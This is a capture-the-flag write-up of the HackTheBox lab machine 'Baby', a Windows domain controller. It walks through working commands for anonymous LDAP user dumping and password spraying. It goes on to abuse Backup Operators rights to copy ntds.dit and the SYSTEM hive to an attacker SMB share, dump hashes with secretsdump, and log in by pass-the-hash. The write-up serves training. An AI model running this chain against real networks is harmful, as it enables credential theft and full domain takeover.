# [HackTheBox - Baby](https://app.hackthebox.com/machines/Baby)
![c6f135fd23e08499dbcf0bcab8d08564.png](../../../../_resources/c6f135fd23e08499dbcf0bcab8d08564.png)
[toc]
***
## Abstract
Baby is a vulnlab machine imported to HackTheBox as a easy Windows Active Directory box, I started with network enumeration with nmap, revealing this machine is a domain controller and no extra service running on this machine.

On the enumeration phase, I found that null session can be used to conduct LDAP search and retrieve a list of user and also the initial password from user description. however there is one user that could not be pull with common user pull method but searching thoughly in the LDAP result will reveal about this user. 

Using password from user description and the hidden user, revealing that we can change password of this user and gain foothold on the machine.

The user that used for footholding is in Backup Operators group which we can backup ntds.dit along with SYSTEM registry hive and dump hashes of all users in the domain using secretdump and then we can use Administrator NTLM hash to login to the machine and root the box.

## Enumeration

Starting with nmap port scanning and we can see that there are multiple ports opened including LDAP and Kerberos which mean this machine is a domain controller. 
```
nmap $IP
```
![26b7efdc620353a2086c3d852c4da222.png](../../../../_resources/26b7efdc620353a2086c3d852c4da222.png)

I rescanned again with `-sCV` flag for service enumeration and nmap script engine which reveals domain and hostname that we can add to hosts file but other information are not too special at this point  
![ff14d3ebf97cfed092a71494342ed65e.png](../../../../_resources/ff14d3ebf97cfed092a71494342ed65e.png)

After adding domain to hosts file. I started enumerate SMB with NetExec tool and we can see that null session could not be used to retrieve anything from  
![f1d4e9c963c1fed550ace9ded12fa705.png](../../../../_resources/f1d4e9c963c1fed550ace9ded12fa705.png)

But after changing protocol to LDAP, we can see that we can pull user lists from the domain and we can also see that we also have a password from user description and it telling us that the initial password of users on this domain is "BabyStart123!" and will likely to be changed after user logon.
```
nxc ldap baby.vl -u '' -p '' --users
```
![2db204965f7ff0c0c07d0b69b3f3c891.png](../../../../_resources/2db204965f7ff0c0c07d0b69b3f3c891.png)

I created a userlist with NetExec and then password spraying all users from this user list but no hit which mean all users already changed their password and it seem like I missed something I shouldn't.
```
nxc ldap baby.vl -u '' -p '' --users-export baby_users.txt
nxc smb baby.vl -u baby_users.txt -p 'BabyStart123!'
```
![2ac46c2fab4c297d6944f279690dca56.png](../../../../_resources/2ac46c2fab4c297d6944f279690dca56.png)
![81e4fe894bd107521a7ac680c1790ab4.png](../../../../_resources/81e4fe894bd107521a7ac680c1790ab4.png)

I used a simple LDAP search to search for something I might have missed and sure enough, there is one user that could not be pulled with my netexec 
```
ldapsearch -H ldap://baby.vl -x -b "DC=baby,DC=vl" | grep member:
```
![05e5906012ebbd05e0e9677198203c52.png](../../../../_resources/05e5906012ebbd05e0e9677198203c52.png)

I tried to find the reason about it and 0xdf gave on on his write-up "That’s because this user doesn’t have any data associated with them" which is really interesting
![985b8b827cb9d296ec8fbddde273a42b.png](../../../../_resources/985b8b827cb9d296ec8fbddde273a42b.png)

I dug into the [source code](https://github.com/Pennyw0rth/NetExec/blob/f981215d776d56234d51f95ac2e48f11e149fe31/nxc/protocols/ldap.py#L740) of NetExec when using ldap to parse user list which reveals that NetExec will retrieve only object with `sAMAccountType` = 805306368 (normal user accounts) and "Caroline.Robinson" does not have this value so it didn't make to the list.
![53e6e1e570ed1d906995202caa67ec33.png](../../../../_resources/53e6e1e570ed1d906995202caa67ec33.png)

## Initial Foothold by Changing password of Caroline.Robinson

I used the credential found on user description on this user and we can see that we can change password of this user and continue our operation.
```
nxc smb baby.vl -u 'Caroline.Robinson' -p 'BabyStart123!'
```
![6609dadf07b72af65f34ae4ebb95de21.png](../../../../_resources/6609dadf07b72af65f34ae4ebb95de21.png)

I used uv to run latest version of NetExec from Github to use change-password module since NetExec on Kali linux is not the latest version and it does not have this module. (you can use other tool to change password of this user)
```
uv run nxc smb baby.vl -u 'Caroline.Robinson' -p 'BabyStart123!' -M change-password -o NEWPASS=Password123
```
![0eef906aa335b4004f160937bb3d3f2a.png](../../../../_resources/0eef906aa335b4004f160937bb3d3f2a.png)

Now we can use this account to eneumerate further but nothing too special on share here.
![d184b24b122d32a5e684378c0e132b6c.png](../../../../_resources/d184b24b122d32a5e684378c0e132b6c.png)

We can use this user to gain a foothold as we can see "Pwn3d!" message from NetExec with WinRM protocol 
```
nxc winrm baby.vl -u 'Caroline.Robinson' -p Password123
```
![2316cf50ce55d71714b1dbc3a8672b7a.png](../../../../_resources/2316cf50ce55d71714b1dbc3a8672b7a.png)

Using [evil-winrm](https://github.com/Hackplayers/evil-winrm), we can gain a foothold and loot user flag located on the desktop of this user.
![495cb95b3a45b41f28535d9e863c6a69.png](../../../../_resources/495cb95b3a45b41f28535d9e863c6a69.png)

## Privilege Escalation with Backup Operators group

After gaining foothold, I used whoami command to list information about current user to find a low-hanging fruit and we can see that this user is a member of Backup Operators group which can backup (SeBackupPrivilege) and restore (SeRestorePrivilege) file on this machine.
```
whoami /all
```
![86434904fbd98b5f38ef2b2c6fa52047.png](../../../../_resources/86434904fbd98b5f38ef2b2c6fa52047.png)

Since this is the domain controller, I will need to create a backup of ntds.dit which is active directory database and SYSTEM registry hive to dump hashes from both of these files, SYSTEM registry can be retrieve with just 1-2 command but on the other hand. I need to create a shadow copy so I can safely retrieve ntds.dit file.

I will use diskshadow to create shadow copy or C drive but first, I need to create a script to automate this first and here in the script
```
set verbose on   
set metadata C:\Windows\Temp\meta.cab   
set context clientaccessible   
set context persistent   
begin backup   
add volume C: alias wowza   
create   
expose %wowza% E:   
end backup
```

The script will create a shadow copy snapshot of C drive and map to E drive and thats it but since this script was created on my Kali Linux, I need to convert Unix format (Line Feed) to DOS format (carriage return + Line feed) which will make this script able to run on Windows.
```
unix2dos diskshadow.txt
```
![28cabc9ae7f5843c32bd774114fb0717.png](../../../../_resources/28cabc9ae7f5843c32bd774114fb0717.png)

Next, I uploaded the script on my winrm session and execute it. no error and now we are ready for the file transfer.
```
upload diskshadow.txt
diskshadow /s diskshadow.txt
```
![ce09650189645b3ef5b09f67aa5bdea4.png](../../../../_resources/ce09650189645b3ef5b09f67aa5bdea4.png)
![2c89cee29b28fb4bd2358de6f21a5210.png](../../../../_resources/2c89cee29b28fb4bd2358de6f21a5210.png)

Since SYSTEM hive and ntds.dit files are quite large so, I opened my netshare share and copy both files to my Kali Linux. This way is much faster than download function in evil-winrm. first I created a backup of SYSTEM hive with reg save command.
```
reg save hklm\system c:\system
cp system.hive \\10.10.14.24\debug\
```
![1b2ada0a9d181e68400962ee83cc16a9.png](../../../../_resources/1b2ada0a9d181e68400962ee83cc16a9.png)
![985f2bfdcd10aa66d3ae23d309d8a909.png](../../../../_resources/985f2bfdcd10aa66d3ae23d309d8a909.png)

Next is ntds.dit file and now we are ready to dump all the hashes inside both files.
```
robocopy /b E:\windows\ntds . ntds.dit
cp ntds.dit \\10.10.14.24\debug\
```
![d512b652ff079e0c93a572daca4eb8c3.png](../../../../_resources/d512b652ff079e0c93a572daca4eb8c3.png)

The tool that can be used to dump hashes is secretsdump from impacket and now we can get NTLM hash of Administrator account and gain access to target system via pass-the-hash technique.
```
impacket-secretsdump -ntds ntds.dit -system system.hive local
```
![6fc8fe601dbfd6152a5c6f96fc7463d1.png](../../../../_resources/6fc8fe601dbfd6152a5c6f96fc7463d1.png)

Login as Administrator and loot the flag, Now we are done :D
```
evil-winrm -i baby.vl -u 'Administrator' -H ee4457ae59f1e3fbd764e33d9cef123d
```
![772a9088ed368afeb8025d4b47c76b7d.png](../../../../_resources/772a9088ed368afeb8025d4b47c76b7d.png)

https://labs.hackthebox.com/achievement/machine/1438364/739
***